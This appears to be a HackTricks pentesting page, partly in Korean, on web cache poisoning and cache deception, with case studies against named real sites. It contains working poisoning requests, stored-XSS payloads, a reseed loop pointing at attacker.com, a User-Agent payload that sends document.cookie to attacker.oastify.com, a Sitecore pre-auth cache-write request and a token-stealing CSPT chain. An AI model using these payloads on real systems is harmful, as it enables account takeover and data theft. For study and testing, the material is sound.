# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## 차이점

> **web cache poisoning과 web cache deception의 차이점은 무엇인가?**
>
> - **web cache poisoning**에서는 공격자가 애플리케이션이 캐시에 악성 콘텐츠를 저장하도록 유도하며, 이 콘텐츠가 캐시에서 제공되어 다른 애플리케이션 사용자에게 전달됩니다.
> - **web cache deception**에서는 공격자가 다른 사용자의 민감한 콘텐츠가 캐시에 저장되도록 유도한 다음, 공격자가 그 콘텐츠를 캐시에서 가져옵니다.

## Cache Poisoning

Cache poisoning은 클라이언트 측 캐시를 조작하여 클라이언트가 예상치 못한, 일부만 있거나 공격자가 제어하는 리소스를 로드하게 만드는 것을 목표로 합니다. 영향 범위는 해당 페이지의 인기(트래픽)에 따라 달라지며, 오염된 응답은 캐시가 오염된 기간 동안 그 페이지를 방문하는 사용자들에게만 제공됩니다.

cache poisoning 공격의 수행은 다음 단계로 이루어집니다:

1. **Identification of Unkeyed Inputs**: 캐시되기 위해 필수적이지는 않지만 서버가 반환하는 응답을 변경할 수 있는 매개변수들입니다. 이러한 입력을 식별하는 것은 캐시를 조작하는 데 악용될 수 있기 때문에 중요합니다.
2. **Exploitation of the Unkeyed Inputs**: unkeyed inputs를 식별한 후에는 공격자에게 유리하게 서버의 응답을 변경하도록 이 매개변수들을 어떻게 악용할지 파악해야 합니다.
3. **Ensuring the Poisoned Response is Cached**: 마지막으로 조작된 응답이 캐시에 저장되도록 확인해야 합니다. 이렇게 하면 캐시가 오염된 동안 영향을 받은 페이지에 접근하는 모든 사용자가 오염된 응답을 받게 됩니다.

### Discovery: Check HTTP headers

보통 응답이 **저장(stored in the cache)** 되었을 때 이를 나타내는 **헤더(header indicating so)**가 있습니다. 어떤 헤더를 확인해야 하는지는 이 글을 참조하세요: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Discovery: Caching error codes

응답이 캐시에 저장되는지 확인하려면, **잘못된 헤더(bad header)**를 포함한 요청을 보내 응답으로 **status code 400**이 반환되는지 확인해보세요. 그런 다음 정상적으로 요청을 접근해 보고 응답이 **400 status code**라면 취약하다는 것을 알 수 있습니다(이 경우 DoS도 가능할 수 있습니다).

다음에서 더 많은 옵션을 찾을 수 있습니다:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

다만, 이러한 종류의 상태 코드는 **항상 캐시되지 않을 수 있으므로** 이 테스트가 항상 신뢰할 수 있는 것은 아니라는 점에 유의하세요.

### Discovery: Identify and evaluate unkeyed inputs

[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)를 사용해 페이지의 응답을 변경할 수 있는 매개변수와 헤더를 **브루트포스(brute-force)**로 찾아볼 수 있습니다. 예를 들어, 페이지가 클라이언트가 스크립트를 그곳에서 로드하도록 지시하기 위해 `X-Forwarded-For` 헤더를 사용하고 있을 수 있습니다:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### 백엔드 서버에서 유해한 응답 유도

With the parameter/header identified check how it is being **sanitised** and **where** is it **getting reflected** or affecting the response from the header. Can you abuse it anyway (perform an XSS or load a JS code controlled by you? perform a DoS?...)

### 응답을 캐시하기

Once you have **identified** the **page** that can be abused, which **parameter**/**header** to use and **how** to **abuse** it, you need to get the page cached. Depending on the resource you are trying to get in the cache this could take some time, you might need to be trying for several seconds.

The header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't cached and the value **`hit`** when it is cached.\
The header **`Cache-Control`** is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`

Another interesting header is **`Vary`**. This header is often used to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim he is targeting, he can poison the cache for the users using that specific `User-Agent`.

One more header related to the cache is **`Age`**. It defines the times in seconds the object has been in the proxy cache.

When caching a request, be **careful with the headers you use** because some of them could be **used unexpectedly** as **keyed** and the **victim will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working.

### Foundational cache poisoning case studies

#### HackerOne global redirect via `X-Forwarded-Host`

- The origin templated redirects and canonical URLs with `X-Forwarded-Host`, but the cache key only used the `Host` header, so a single response poisoned every visitor to `/`.
- Poison with:
```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```
- 스푸핑된 헤더 없이 즉시 `/`를 다시 요청하세요; 리다이렉트가 계속되면 전역 host-spoofing primitive가 있어 반사된 리다이렉트/Open Graph 링크를 종종 저장된 이슈로 승격시킵니다.

#### GitHub repository DoS via `Content-Type` + `PURGE`

- 익명 트래픽은 경로만으로 키가 지정되었고, 백엔드는 예상치 못한 `Content-Type`을 만나면 에러 상태에 들어갔습니다. 그 에러 응답은 해당 repo의 모든 unauthenticated 사용자에게 캐시될 수 있었습니다.
- GitHub는 또한(우연히) `PURGE` 동사를 허용하여 공격자가 정상 엔트리를 플러시하고 캐시가 필요 시 오염된 변형을 가져오도록 강제할 수 있었습니다:
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```
- 항상 인증된(authenticated) vs 익명(anonymous) cache keys를 비교하고, `Content-Type`처럼 거의 키로 사용되지 않는 헤더들을 fuzz하며, 노출된 cache-maintenance verbs를 탐색해 re-poisoning을 자동화하세요.

#### Shopify cross-host persistence loops

- 다중 계층 캐시는 새 객체를 커밋하기 전에 동일한 요청을 여러 번 필요로 할 수 있습니다. Shopify는 동일한 캐시를 여러 지역화된 호스트에 걸쳐 재사용했기 때문에 persistence는 많은 properties에 영향을 미쳤습니다.
- 짧은 자동화 루프를 사용해 반복적으로 reseed하세요:
```python
import requests, time
for i in range(100):
requests.get("https://shop.shopify.com/endpoint",
headers={"X-Forwarded-Host": "attacker.com"})
time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```
- `hit` 응답 후, 같은 캐시 네임스페이스를 공유하는 다른 호스트/자산을 크롤링하여 교차 도메인 영향 범위를 입증하세요.

#### JS 자산 리다이렉트 → stored XSS 체인

- Private programs는 종종 수십 개의 서브도메인에 걸쳐 `/assets/main.js` 같은 공유 JS를 호스팅합니다. 만약 `X-Forwarded-Host`가 해당 자산들의 리다이렉트 로직에 영향을 주는데 키가 설정되어 있지 않다면, 캐시된 응답은 301로 attacker JS를 가리키게 되어 그 자산이 임포트되는 모든 곳에서 stored XSS를 발생시킵니다.
```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- 동일한 asset path를 재사용하는 호스트를 매핑하여 multi-subdomain compromise를 증명하세요.

#### GitLab 정적 DoS를 통한 `X-HTTP-Method-Override`

- GitLab는 Google Cloud Storage에서 정적 번들을 제공했으며, 해당 서비스는 `X-HTTP-Method-Override`를 준수했습니다. GET을 HEAD로 오버라이드하면 캐시 가능한 `200 OK`와 `Content-Length: 0`을 반환했고, 엣지 캐시는 키를 생성할 때 HTTP method를 무시했습니다.
```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- 단일 요청이 모든 GET에 대해 JS 번들을 빈 바디로 교체하여 UI를 사실상 DoSing 했습니다. 항상 method overrides (`X-HTTP-Method-Override`, `X-Method-Override`, 등)을 정적 자산에 대해 테스트하고 캐시가 메서드별로 달라지는지 확인하세요.

#### HackerOne 정적 자산 루프 (`X-Forwarded-Scheme`를 통해)

- Rails’ Rack middleware는 HTTPS 적용 여부를 결정하기 위해 `X-Forwarded-Scheme`를 신뢰했습니다. `/static/logo.png`에 대해 `http`로 스푸핑하면 캐시 가능한 301이 발생해 이후 모든 사용자에게 자산 대신 리디렉션(또는 루프)이 전달되었습니다:
```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
- 가능한 경우 scheme spoofing과 host spoofing을 결합하여 가시성이 높은 리소스에 대해 되돌릴 수 없는 리다이렉트를 생성하세요.

#### Cloudflare host-header 대소문자 불일치

- Cloudflare는 cache keys용으로 `Host` 헤더를 정규화했지만 raw casing을 origins로 전달했습니다. `Host: TaRgEt.CoM`을 전송하면 origin의 routing/templating에서 다른 동작을 유발하면서도 canonical lowercase cache bucket에는 항목이 채워졌습니다.
```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```
- mixed-case hosts(및 기타 normalized headers)를 재전송(replay)하고 cached response와 origin response를 diff하여 CDN tenants를 열거하고 shared-platform cache poisonings를 찾아냅니다.

#### Red Hat Open Graph meta poisoning

- Open Graph 태그 안에 `X-Forwarded-Host`를 주입하면 CDN이 페이지를 캐시했을 때 reflected HTML injection이 stored XSS로 바뀝니다. 테스트 중에는 production users에게 피해를 주지 않도록 harmless cache buster를 사용하세요:
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```
- 소셜 미디어 스크래퍼는 캐시된 Open Graph 태그를 소비하므로, 단일 poisoned entry가 페이로드를 직접 방문자보다 훨씬 넓게 배포합니다.

## 악용 예시

### 가장 쉬운 예

A header like `X-Forwarded-For` is being reflected in the response unsanitized.\
기본 XSS payload를 보내고 poison the cache하면 페이지에 접근하는 모든 사용자가 XSSed됩니다:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

**[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** 에서는 다음과 같은 간단한 시나리오가 설명됩니다:

- CDN은 `/share/` 이하의 모든 것을 캐시합니다.
- CDN은 `%2F..%2F`를 디코드하거나 정규화하지 않으므로, **path traversal to access other sensitive locations that will be cached**로 사용될 수 있습니다. 예: `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- 웹 서버는 `%2F..%2F`를 디코드하고 정규화하며 `/api/auth/session`로 응답합니다. 이 응답은 **contains the auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

쿠키는 페이지 응답에 반사될 수도 있습니다. 예를 들어 이를 악용해 XSS를 유발할 수 있다면, 악성 캐시 응답을 불러오는 여러 클라이언트에서 XSS를 악용할 수 있습니다.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Note that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

참조:

{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) 어떻게 `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` 같은 URL로 OpenAI API key를 탈취할 수 있었는지 설명합니다. 그 이유는 `/share/*`와 매칭되는 모든 것이 Cloudflare가 URL을 정규화하지 않은 상태로 cache되어, 요청이 웹 서버에 도달했을 때 정규화가 이루어졌기 때문입니다.

이것은 다음 문서에서도 더 잘 설명되어 있습니다:

{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

때때로 cache를 악용하기 위해 **exploit several unkeyed inputs**가 필요합니다. 예를 들어, `X-Forwarded-Host`를 당신이 제어하는 도메인으로 설정하고 `X-Forwarded-Scheme`를 `http`로 설정하면 **Open redirect**를 발견할 수 있습니다. 만약 **서버**가 모든 **HTTP** 요청을 **HTTPS**로 포워딩하고 리다이렉트의 도메인 이름으로 헤더 `X-Forwarded-Scheme`를 사용한다면, 리다이렉트가 페이지를 가리키는 위치를 제어할 수 있습니다.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### 제한된 `Vary`header로 Exploiting

만약 **`X-Host`** 헤더가 **JS 리소스를 로드하기 위한 도메인 이름**으로 사용되는데 응답의 **`Vary`** 헤더가 **`User-Agent`**로 표시되어 있다면, 피해자의 `User-Agent`를 exfiltrate하고 그 user agent로 캐시를 poison할 방법을 찾아야 합니다:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

요청을 URL과 요청 본문에 모두 넣어 GET 요청을 전송하세요. 웹 서버가 요청 본문에 있는 값을 사용하지만 캐시 서버가 URL에 있는 값을 캐시한다면, 해당 URL에 접근하는 누구나 실제로는 요청 본문에 있는 파라미터를 사용하게 됩니다. Github 웹사이트에서 James Kettle이 발견한 vuln처럼:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

For example it's possible to separate **parameters** in ruby servers using the char **`;`** instead of **`&`**. This could be used to put unkeyed parameters values inside keyed ones and abuse them.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

여기에서 [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning)를 수행하는 방법을 확인하세요.

### Automated testing for Web Cache Poisoning

[Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)은 web cache poisoning을 자동으로 테스트하는 데 사용할 수 있습니다. 다양한 기법을 지원하며 높은 수준의 커스터마이징이 가능합니다.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

이 실제 패턴은 헤더 기반의 반사 primitive와 CDN/WAF 동작을 연결하여 다른 사용자에게 제공되는 캐시된 HTML을 신뢰성 있게 오염시킵니다:

- The main HTML reflected an untrusted request header (e.g., `User-Agent`) into executable context.
- The CDN stripped cache headers but an internal/origin cache existed. The CDN also auto-cached requests ending in static extensions (e.g., `.js`), while the WAF applied weaker content inspection to GETs for static assets.
- Request flow quirks allowed a request to a `.js` path to influence the cache key/variant used for the subsequent main HTML, enabling cross-user XSS via header reflection.

Practical recipe (observed across a popular CDN/WAF):

1) From a clean IP (avoid prior reputation-based downgrades), set a malicious `User-Agent` via browser or Burp Proxy Match & Replace.
2) In Burp Repeater, prepare a group of two requests and use "Send group in parallel" (single-packet mode works best):
- First request: GET a `.js` resource path on the same origin while sending your malicious `User-Agent`.
- Immediately after: GET the main page (`/`).
3) The CDN/WAF routing race plus the auto-cached `.js` often seeds a poisoned cached HTML variant that is then served to other visitors sharing the same cache key conditions (e.g., same `Vary` dimensions like `User-Agent`).

Example header payload (to exfiltrate non-HttpOnly cookies):
```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Many CDNs hide cache headers; poisoning may appear only on multi-hour refresh cycles. Use multiple vantage IPs and throttle to avoid rate-limit or reputation triggers.
- Using an IP from the CDN's own cloud sometimes improves routing consistency.
- If a strict CSP is present, this still works if the reflection executes in main HTML context and CSP allows inline execution or is bypassed by context.

Impact:

- If session cookies aren’t `HttpOnly`, zero-click ATO is possible by mass-exfiltrating `document.cookie` from all users who are served the poisoned HTML.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:
```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
This writes arbitrary HTML under an attacker‑chosen cache key, enabling precise poisoning once cache keys are known.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## 취약한 예시

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS는 URL 내부의 fragment를 제거하지 않고 전달했고, cache key는 fragment를 무시하고 host, path 및 query만 사용하여 생성했습니다. 따라서 요청 `/#/../?r=javascript:alert(1)`는 백엔드로 `/#/../?r=javascript:alert(1)`로 전송되었고, cache key에는 페이로드가 포함되지 않고 host, path 및 query만 포함되었습니다.

### 403 및 Storage Buckets

Cloudflare는 과거에 403 응답을 캐시했습니다. 잘못된 Authorization 헤더로 S3 또는 Azure Storage Blobs에 접근을 시도하면 403 응답이 발생하고 이 응답이 캐시되곤 했습니다. Cloudflare는 403 응답 캐싱을 중단했지만, 이 동작은 다른 프록시 서비스에 여전히 존재할 수 있습니다.

### Injecting Keyed Parameters

캐시들은 종종 특정 GET 파라미터를 cache key에 포함합니다. 예를 들어, Fastly의 Varnish는 요청에서 `size` 파라미터를 캐시했습니다. 그러나 파라미터의 URL-encoded 버전(예: `siz%65`)이 잘못된 값으로 함께 전송되면, cache key는 올바른 `size` 파라미터를 사용하여 구성됩니다. 반면 백엔드는 URL-encoded 파라미터의 값을 처리합니다. 두 번째 `size` 파라미터를 URL-encoding하면 캐시는 이를 누락시키지만 백엔드는 사용하게 됩니다. 이 파라미터에 0 값을 할당하면 캐시 가능한 400 Bad Request 오류가 발생했습니다.

### User Agent Rules

일부 개발자는 FFUF나 Nuclei 같은 트래픽이 많은 도구들의 user-agent와 일치하는 요청을 차단하여 서버 부하를 관리합니다. 역설적으로, 이 방법은 cache poisoning이나 DoS 같은 취약점을 유발할 수 있습니다.

### Illegal Header Fields

[https://datatracker.ietf.mrg/doc/html/rfc7230](https://datatracker.ietf.mrg/doc/html/rfc7230)는 헤더 이름에서 허용되는 문자를 지정합니다. 명시된 **tchar** 범위를 벗어나는 문자를 포함한 헤더는 이상적으로 400 Bad Request 응답을 유발해야 합니다. 실제로는 서버들이 항상 이 표준을 준수하지 않습니다. 주목할 만한 예로 Akamai는 잘못된 문자를 포함한 헤더를 전달하고 `cache-control` 헤더가 없으면 모든 400 오류를 캐시했습니다. 예를 들어 `\`와 같은 불법 문자를 포함한 헤더를 전송하면 캐시 가능한 400 Bad Request 오류가 발생하는 취약 패턴이 확인되었습니다.

### 새로운 헤더 찾기

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

First of all note that **extensions** such as `.css`, `.js`, `.png` etc are usually **configured** to be **saved** in the **cache.** Therefore, if you access `www.example.com/profile.php/nonexistent.js` the cache will probably store the response because it sees the `.js` **extension**. But, if the **application** is **replaying** with the **sensitive** user contents stored in _www.example.com/profile.php_, you can **steal** those contents from other users.

Other things to test:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
In the example, it is explained that if you load a non-existent page like _http://www.example.com/home.php/non-existent.css_ the content of _http://www.example.com/home.php_ (**with the user's sensitive information**) is going to be returned and the cache server is going to save the result.\
Then, the **attacker** can access _http://www.example.com/home.php/non-existent.css_ in their own browser and observe the **confidential information** of the users that accessed before.

Note that the **cache proxy** should be **configured** to **cache** files **based** on the **extension** of the file (_.css_) and not base on the content-type. In the example _http://www.example.com/home.php/non-existent.css_ will have a `text/html` content-type instead of a `text/css` mime type.

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

This pattern combines a Client-Side Path Traversal (CSPT) primitive in a Single-Page App (SPA) with extension-based CDN caching to publicly cache sensitive JSON that was originally only available via an authenticated API call.

High level idea:

- A sensitive API endpoint requires a custom auth header and is correctly marked as non-cacheable by origin.
- Appending a static-looking suffix (for example, .css) makes the CDN treat the path as a static asset and cache the response, often without varying on sensitive headers.
- The SPA contains CSPT: it concatenates a user-controlled path segment into the API URL while attaching the victim’s auth header (for example, X-Auth-Token). By injecting ../.. traversal, the authenticated fetch is redirected to the cacheable path variant (…/v1/token.css), causing the CDN to cache the victim’s token JSON under a public key.
- Anyone can then GET that same cache key without authentication and retrieve the victim’s token.

Example

- Sensitive endpoint (non-cacheable at origin):
```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- 정적처럼 보이는 접미사가 CDN을 캐시 가능하게 전환함:
```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- CSPT in SPA는 auth header를 첨부하고 traversal를 허용함:
```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
method: 'GET',
headers: { 'X-Auth-Token': authToken }
});
```
- 익스플로잇 체인:
1. 피해자를 SPA 경로 파라미터에 dot-segments를 주입하는 URL로 유도합니다. 예:
- [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
2. SPA는 인증된 fetch를 다음 주소로 전송합니다:
- [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
3. 브라우저 정규화는 이를 다음으로 해석합니다:
- [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
4. CDN은 .css를 정적 자산으로 취급하고 JSON을 Cache-Control: public, max-age=...와 함께 캐시합니다.
5. 공개 조회: 누구나 https://api.example.com/v1/token.css 를 GET하여 캐시된 token JSON을 얻을 수 있습니다.

전제 조건

- SPA가 동일한 API 오리진(또는 작동하는 CORS가 설정된 cross-origin)으로 인증된 fetch/XHR를 수행하고 민감한 헤더나 bearer tokens를 첨부한다.
- Edge/CDN이 확장자 기반으로 정적로 보이는 경로(예: *.css, *.js, 이미지)를 캐싱하고 민감한 헤더를 캐시 키에 반영하지 않는다.
- 기본 엔드포인트의 오리진은 캐시 불가(정상)로 설정되어 있지만, 확장자가 붙은 변형은 edge 규칙에 의해 허용되거나 차단되지 않는다.

검증 체크리스트

- 민감한 동적 엔드포인트를 식별하고 .css, .js, .jpg, .json 같은 접미사를 시도하세요. 콘텐츠가 여전히 JSON인 상태에서 Cache-Control: public/max-age 및 X-Cache: Hit (또는 동등한 값, 예: CF-Cache-Status)를 확인하세요.
- 인증 헤더를 첨부하면서 사용자 제어 입력을 API 경로에 이어붙이는 클라이언트 코드를 찾으세요. ../ 시퀀스를 주입해 인증된 요청을 목표 엔드포인트로 리다이렉트하세요.
- 리타겟된 요청에 인증 헤더가 포함되어 있는지(예: 프록시 또는 서버 로그에서) 확인하고 CDN이 해당 경로로 응답을 캐시하는지 확인하세요.
- 새로운 컨텍스트(인증 없음)에서 동일한 경로를 요청하여 비밀 JSON이 캐시에서 제공되는지 확인하세요.

## 자동 도구

- [**toxicache**](https://github.com/xhzeem/toxicache): URL 목록에서 web cache poisoning 취약점을 찾고 여러 주입 기법을 테스트하는 Golang 스캐너.

## References

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
